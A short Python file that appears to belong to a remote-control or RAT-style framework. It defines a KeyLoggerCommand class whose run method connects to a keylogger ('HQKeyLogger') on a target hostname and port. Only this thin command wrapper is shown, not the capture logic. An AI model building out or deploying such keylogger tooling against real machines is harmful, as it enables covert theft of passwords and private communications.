from Universal import Command
from Universal.constants import CommandConstants as consts
from ..KeyLogger import HQKeyLogger


class KeyLoggerCommand(Command):
    def __init__(self, command_literal, connection_socket, hostname, port=consts.KEYLOGGER_DEFAULT_PORT):
        super(KeyLoggerCommand, self).__init__(command_literal, connection_socket, hostname=hostname, port=port)

    def run(self):
        kl = HQKeyLogger(self.hostname)
        kl.connect()
